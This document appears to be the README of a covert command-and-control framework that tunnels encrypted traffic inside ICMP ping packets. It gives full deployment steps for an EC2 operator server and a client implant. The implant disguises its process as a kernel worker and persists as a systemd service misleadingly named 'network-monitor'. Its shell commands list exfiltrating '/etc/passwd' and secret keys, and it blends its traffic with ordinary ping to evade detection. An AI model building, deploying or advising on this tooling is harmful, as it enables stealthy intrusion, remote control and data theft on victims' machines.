

# Hardened ICMP Command & Control Framework — Technical Blueprint

This document details the software architecture, programmatic execution flow,
and deployment procedures for the production-grade covert asynchronous C&C
subsystem operating over authenticated raw network sockets.

---

## 1. Architectural Program Flow & Component Integration

### Detailed Execution Overview
The framework is built from the ground up using a non-blocking asynchronous
I/O architecture powered by the `asyncio` event loop. It decouples high-overhead
kernel network sniffing and synchronous OS process spawning from the main event
loop to eliminate execution lag or pipeline stalls.

1. **System Initialization (Bootstrapping Layer):**
   - The handler (`cnc_handler.py`) loads the Ed25519 server identity private key
     by first querying AWS SSM Parameter Store (`/cnc/server_private_hex`,
     `WithDecryption=True`). If SSM is unavailable, it falls back to reading
     `server/.env.server` (permissions must be exactly `600`; any group or other
     bits cause an immediate `PermissionError`).
   - The server derives the Ed25519 public key from the loaded private key and
     calls `cnc_crypto.init_handshake_psk(pub_bytes)`. The client calls the same
     function with the hardcoded `SERVER_IDENTITY_PUB_HEX` constant at startup.
     Both calls run HKDF-SHA256 over the 32-byte Ed25519 public key with info
     `b"cnc-handshake-bootstrap-psk-v1"`, producing a deterministic 32-byte
     bootstrap PSK with no hardcoded secrets in any source file.
   - Both nodes call `update_dynamic_packet_size()` to compute the maximum safe
     chunk size from the configured packet ceiling, subtracting fixed IP (20 B),
     ICMP (8 B), and custom frame header (30 B) overheads.
   - Each endpoint spawns a background OS thread running `scapy.AsyncSniffer`
     bound to the specified interface. The BPF filter restricts capture to ICMP
     traffic from the peer's IP only. Captured raw bytes are relayed back onto
     the primary event loop via `event_loop.call_soon_threadsafe(queue.put_nowait, ...)`.

2. **Ephemeral Key Exchange & Session Establishment (Handshake Layer):**
   - Before any command traffic, the client initiates an authenticated key exchange.
   - The client generates a fresh X25519 ephemeral keypair and sends an `HS_INIT`
     frame (encoded under the HKDF-derived bootstrap PSK) containing its ephemeral
     public key (32 B) to the server.
   - The server generates its own X25519 ephemeral keypair, signs its public key
     with the long-term Ed25519 identity private key (producing a 64-byte signature),
     and returns an `HS_RESP` frame containing `srv_eph_pub (32 B) + signature (64 B)`.
   - The client verifies the Ed25519 signature against `SERVER_IDENTITY_PUB_HEX`
     hardcoded in `agent_session.py`. A failed verification aborts the session
     immediately and prints a MitM warning.
   - Both sides independently derive the session key via `HKDF-SHA256` over the
     X25519 shared secret. The bootstrap PSK is replaced by this ephemeral session
     key for all subsequent frames. Session teardown (`destroy_session_crypto`)
     re-derives the bootstrap PSK from the identity public key, so each new
     handshake starts clean with no reuse of prior session material.
   - The server tracks the client's ephemeral public key to distinguish genuine
     retransmits (same key → re-send cached `HS_RESP`) from new sessions
     (different key → full new handshake). Stale queued commands are drained on
     every new handshake to prevent ghost command delivery.
   - **NAT traversal:** the server reads `packet[ICMP].id` and `packet[ICMP].seq`
     from every inbound frame and echoes them back on every reply. Home routers
     and NAT devices remap the ICMP identifier; echoing back the remapped values
     ensures the reply passes the NAT state table and reaches the client.

3. **Isolated Wire Verification & Cryptographic Processing:**
   - Every frame is protected by an HMAC-SHA256 tag (truncated to 16 B), computed
     over the full header and ciphertext using a key derived from the session PSK.
   - The server tries the active session key first; if HMAC fails, it retries with
     the bootstrap PSK to handle in-flight handshake frames. Frames that fail both
     checks are silently discarded.
   - The payload is encrypted with ChaCha20, keyed from the session PSK and a
     per-frame nonce constructed from `(net_opcode, transfer_id, seq_id)`,
     guaranteeing that identical plaintext never produces the same ciphertext
     across different frames.

4. **Robust State Machine & ARQ Flow Control:**
   - Payloads are fragmented into chunks bounded by `max_data_size` and delivered
     via a Stop-and-Wait ARQ protocol. Each send blocks until an `OPCODE_ACK`
     matching the exact `(transfer_id, seq_id)` pair is received.
   - Retransmit timeouts are adaptive: the base timeout is `max(0.25s, RTT × 2.5)`
     where RTT is updated via exponential moving average (`α = 0.2`) on every
     successfully acknowledged non-retransmit packet. Successive retries apply
     an exponential backoff factor of `1.5×`, capped at `5.0s`. After 5 failed
     attempts the session is flagged for reconnection (`_needs_reconnect = True`)
     and a bare `OPCODE_RESET` frame is sent to the server.
   - Parallel execution branches (heartbeat loop and reactive command outputs)
     are fully synchronized using `tx_lock`, preventing packet interleaving or
     sequence number corruption.
   - Terminal state protection (`_terminal_state_active`) keeps the client in a
     `TERMINATING` state after receiving the EOF chunk of a command frame. New
     incoming frames are deferred until the current command finishes executing
     and its response is fully acknowledged. Retransmits of the exact same
     `(transfer_id, seq_id)` are ACK'd immediately without re-execution.
   - The server only sends frames to the client when it has a real command to
     deliver. No keepalive frames are injected server-side, avoiding spurious
     ACK timeout cascades during client command execution.

5. **Beacon-Driven Command Dispatch:**
   - The client sends periodic heartbeat beacons (`OPCODE_CMD / CMD_KEEPALIVE`)
     at log-normal jittered intervals. The configured median is `10.0 s`; the
     distribution uses `σ = 0.35` producing a right-skewed shape where most gaps
     cluster near the median while occasional longer silences mimic organic
     user-driven ICMP traffic. A hard floor of `1.0 s` prevents burst pileup.
   - The server's `reactive_network_dispatcher` dequeues each inbound message,
     prints any command result, then dispatches the next queued operator command
     from `outbound_queue` if one exists. Commands entered via the shell loop are
     enqueued and dispatched on the next beacon cycle.
   - The SHUTDOWN path encodes the `OPCODE_SHUTDOWN` frame **before** destroying
     the session key, ensuring the frame is authenticated and the client can
     cleanly terminate its own session.

6. **Traffic Blending:**
   - **ICMP identity:** the ICMP identifier field is set to `os.getpid() & 0xFFFF`,
     matching the behaviour of real `ping` utilities. The sequence counter starts
     from a random 16-bit seed and increments monotonically, wrapping at 65535.
   - **Payload padding:** frames shorter than 56 bytes are padded with random bytes
     to a uniformly chosen target in `[56, 84]` bytes, matching the default payload
     sizes of `ping` on Linux and Windows. The receiver uses the declared payload
     length field to strip padding transparently.
   - **Process masquerade:** the client calls `setproctitle("[kworker/u2:0]")` at
     startup, replacing its visible process name in `ps`, `top`, and `/proc/<pid>/cmdline`
     with a common Linux kernel worker thread name.
   - **Daemon mode:** with `--daemon` the agent double-forks, calls `setsid()`, and
     redirects stdout/stderr to the configured log file, fully detaching from any
     controlling terminal.

7. **Reconnection Loop:**
   - `agent_beacon.py main()` wraps the entire session lifecycle in a `while` loop.
     On each iteration it resets all per-session state (`reset_session_state()`),
     starts the dispatcher, and attempts the handshake. A handshake failure retries
     after 30 s. After a successful handshake the heartbeat and dispatcher run
     concurrently; the monitor detects `_needs_reconnect` (set by ARQ exhaustion)
     within 1 s, cancels both tasks, waits 10 s, destroys the session key, and
     re-enters the handshake. A `SHUTDOWN` frame from the server sets
     `should_agent_exit = True` and breaks the outer loop cleanly.

---

### Architectural Integration Diagram

```text
  +-----------------------------------------------------------------------+
  |                             SERVER ENDPOINT                           |
  |                                                                       |
  |  +------------------------+  outbound_queue   +--------------------+  |
  |  |     cnc_handler.py     | ----------------> |   cnc_session.py   |  |
  |  | (Console Shell / CLI)  |                   | (Dispatcher / ARQ) |  |
  |  +------------------------+                   +--------------------+  |
  |                                                        |              |
  |                                               run_in_executor (send)  |
  |                                                        v              |
  |  +------------------------+ call_soon_threadsafe +------------------+  |
  |  |     cnc_session.py     | <------------------ |  scapy Sniffer   |  |
  |  | (inbound_queue verify) |                     | (OS Worker Thread)|  |
  |  +------------------------+                     +------------------+  |
  +----------|-----------------------------------------------^-----------+
             |                                               |
             | ICMP Echo Reply  (Type 0)                     | ICMP Echo Request (Type 8)
             | ChaCha20 + HMAC-SHA256                        | ChaCha20 + HMAC-SHA256
             | echoes client ICMP id/seq (NAT-safe)          | id=PID&0xFFFF, seq++
             v                                               |
  +----------|-----------------------------------------------|----------+
  |          v                                               |          |
  |  +------------------------+ call_soon_threadsafe +------------------+  |
  |  |    agent_session.py    | <------------------- |  scapy Sniffer   |  |
  |  | (inbound_queue verify) |                      | (OS Worker Thread)|  |
  |  +------------------------+                      +------------------+  |
  |          |                                                           |
  |    asyncio.create_task                                               |
  |          v                                                           |
  |  +------------------------+  run_in_executor   +-------------------+  |
  |  |    agent_beacon.py     | -----------------> |   agent_beacon.py  |  |
  |  | (Reconnect / Heartbeat)|                    | (App Task Executor)|  |
  |  +------------------------+                    +-------------------+  |
  |                                                                       |
  |                             CLIENT ENDPOINT                           |
  +-----------------------------------------------------------------------+

  Shared Library (common/src/common/):
    cnc_core.py   — frame encoding/decoding, ChaCha20+HMAC, RTT, ARQ helpers,
                    ICMP id/seq blending, log-normal jitter, payload padding
    cnc_crypto.py — X25519 ECDH, Ed25519 sign/verify, HKDF-SHA256, PSK init,
                    session key derivation and zeroization
```

---

## 2. Deployment Guide & Operational Reference

The framework requires root privileges (`sudo`) on both endpoints to open raw
layer-3 sockets for packet injection and capture.

### Prerequisites

```bash
# On both machines
pip install scapy cryptography

# Server only (for AWS SSM)
pip install boto3

# Client only (for process masquerading)
pip install setproctitle
```

---

### Step 1 — Install the Shared Library

Run once from the repository root on **every machine** that runs server or client:

```bash
pip install -e common/
```

The `common/` package (`cnc_core`, `cnc_crypto`) is installed in editable mode so
local edits take effect immediately without reinstalling.

---

### Step 2 — Generate the Server Identity Keypair

Run once on any machine. The script writes `server/.env.server` (mode `600`) and
prints the public key hex to stdout.

```bash
python3 server/key_creation.py
```

Expected output:

```
[+] Server identity keypair generated.
SERVER_PRIVATE_HEX written to server/.env.server (chmod 600)

Paste this into client/agent_session.py → SERVER_IDENTITY_PUB_HEX:
  aa870b88e1d7591ef21420bf3f5d0a10cc7f2b15aa98f1db453a7faf892c1b8d
```

---

### Step 3 — Embed the Public Key in the Client

Open `client/agent_session.py` and replace the constant with the hex printed above:

```python
SERVER_IDENTITY_PUB_HEX = "aa870b88e1d7591ef21420bf3f5d0a10cc7f2b15aa98f1db453a7faf892c1b8d"
```

This value authenticates the server on every handshake. Rebuild and redeploy the
client binary whenever the server key is rotated.

---

### Step 4 — Deploy the Server to AWS EC2

`deploy_server.sh` automates the full deployment in one command. It reads the
private key from `server/.env.server`, uploads it to SSM as a SecureString,
rsyncs all server code to the instance, installs dependencies, and verifies that
the instance can retrieve the key from SSM before returning.

```bash
# Pass the EC2 public IP as the first argument
./deploy_server.sh 16.164.103.63

# Or via environment variable
EC2_HOST=16.164.103.63 ./deploy_server.sh
```

**Overridable environment variables:**

| Variable             | Default                  | Purpose                        |
|----------------------|--------------------------|--------------------------------|
| `EC2_HOST`           | *(required)*             | EC2 public IPv4                |
| `AWS_DEFAULT_REGION` | `il-central-1`           | AWS region                     |
| `EC2_USER`           | `ubuntu`                 | SSH username on the instance   |
| `KEY_FILE`           | `./cnc-server-key.pem`   | Path to the EC2 SSH key file   |
| `REMOTE_DIR`         | `/home/ubuntu/cnc`       | Remote working directory       |

The EC2 IAM role must have `ssm:GetParameter` permission on
`/cnc/server_private_hex`. The script fails loudly at step 5 if it does not.

---

### Step 5 — Run the C&C Server

```bash
# SSH into the instance
ssh -i cnc-server-key.pem ubuntu@<EC2_IP>

# Start the server (replace CLIENT_NAT_IP with the client's public IP)
sudo AWS_DEFAULT_REGION=il-central-1 \
    python3 ~/cnc/server/cnc_handler.py -i eth0 -d <CLIENT_NAT_IP>

# Background with log file
sudo AWS_DEFAULT_REGION=il-central-1 \
    nohup python3 ~/cnc/server/cnc_handler.py -i eth0 -d <CLIENT_NAT_IP> \
    > /var/log/cnc-server.log 2>&1 &
tail -f /var/log/cnc-server.log
```

**Server arguments:**

| Flag                         | Required | Default | Description                                    |
|------------------------------|----------|---------|------------------------------------------------|
| `-i`, `--interface`          | Yes      | —       | Network interface (e.g., `eth0`, `ens5`)       |
| `-d`, `--destination-ip`     | Yes      | —       | Client's public IPv4 (NAT address)             |
| `-s`, `--packet-size`        | No       | `64`    | Total packet size ceiling in bytes             |

**Interactive shell commands (once the client connects):**

```
>> ls /etc                       # list directory on the client
>> run /usr/bin/whoami           # execute a binary on the client
>> copy /etc/passwd              # exfiltrate a file → saved to received_files/
>> get /home/user/secret.key     # alias for copy
>> exit                          # send SHUTDOWN and terminate session
```

---

### Step 6 — Run the Client Agent

**Standard foreground mode:**

```bash
sudo .venv/bin/python3 client/agent_beacon.py -i <interface> -d <server_ip>
```

**Daemon mode** (detach from terminal, log to file):

```bash
sudo .venv/bin/python3 client/agent_beacon.py -i eth0 -d <server_ip> \
    --daemon --log /var/log/net-monitor.log
```

**Install as a systemd service** (survives reboots):

```bash
# Writes /etc/systemd/system/network-monitor.service and exits
sudo .venv/bin/python3 client/agent_beacon.py -i eth0 -d <server_ip> --install-service

# Enable and start
sudo systemctl enable --now network-monitor

# Follow logs
journalctl -u network-monitor -f
```

**Client arguments:**

| Flag                  | Required | Default      | Description                                         |
|-----------------------|----------|--------------|-----------------------------------------------------|
| `-i`, `--interface`   | Yes      | —            | Network interface to use                            |
| `-d`, `--server-ip`   | Yes      | —            | Server's public IPv4                                |
| `-s`, `--packet-size` | No       | `64`         | Packet size ceiling (must match server)             |
| `--daemon`            | No       | off          | Double-fork and detach from terminal                |
| `--log`               | No       | `/dev/null`  | Log file path when running as daemon                |
| `--install-service`   | No       | off          | Write systemd unit file and exit (requires root)    |
| `--source-ip`         | No       | —            | Override source IP (loopback testing only)          |
| `--simulate-drop`     | No       | off          | Drop 15% of ACKs to stress-test ARQ resilience      |

---

### Step 7 — Loopback Testing (Single Machine)

The Linux kernel intercepts ICMP echo requests sent to loopback and replies
automatically, colliding with the server's crafted replies. To avoid this, add
a second loopback address and assign each endpoint a distinct IP:

```bash
# Add a second loopback IP (once per boot, or persist in /etc/network/interfaces)
sudo ip addr add 127.0.0.2/8 dev lo

# Terminal 1 — server binds to 127.0.0.1
sudo .venv/bin/python3 server/cnc_handler.py -i lo -d 127.0.0.2

# Terminal 2 — client sends from 127.0.0.2, reaches server at 127.0.0.1
sudo .venv/bin/python3 client/agent_beacon.py -i lo -d 127.0.0.1 --source-ip 127.0.0.2
```

The kernel still generates automatic ICMP replies to 127.0.0.2, but the server
sniffer only accepts frames from `127.0.0.2` and the client sniffer only accepts
replies from `127.0.0.1`, so the kernel replies are filtered out by the BPF
expression and never reach the application queues.

---

## 3. Security Properties Summary

| Property                  | Mechanism                                                   |
|---------------------------|-------------------------------------------------------------|
| Server authentication     | Ed25519 signature on ephemeral key, verified by pinned pubkey |
| Forward secrecy           | X25519 ephemeral keypair discarded after each handshake     |
| Frame confidentiality     | ChaCha20 with per-frame nonce `(opcode, tid, seq)`          |
| Frame integrity           | HMAC-SHA256 (truncated 16 B) over header + ciphertext       |
| Key zeroization           | Session key overwritten in RAM on teardown                  |
| Bootstrap PSK             | HKDF-SHA256 over server Ed25519 pubkey — no hardcoded secret |
| Private key storage       | AWS SSM SecureString (primary) or chmod-600 env file        |
| NAT traversal             | Server echoes client ICMP id/seq on every reply             |
| Traffic blending          | PID-based ICMP id, ping-sized payloads, log-normal jitter   |
| Process concealment       | `setproctitle("[kworker/u2:0]")`, optional daemonization    |
| Path traversal prevention | `O_NOFOLLOW`, `commonpath` check on all file operations     |
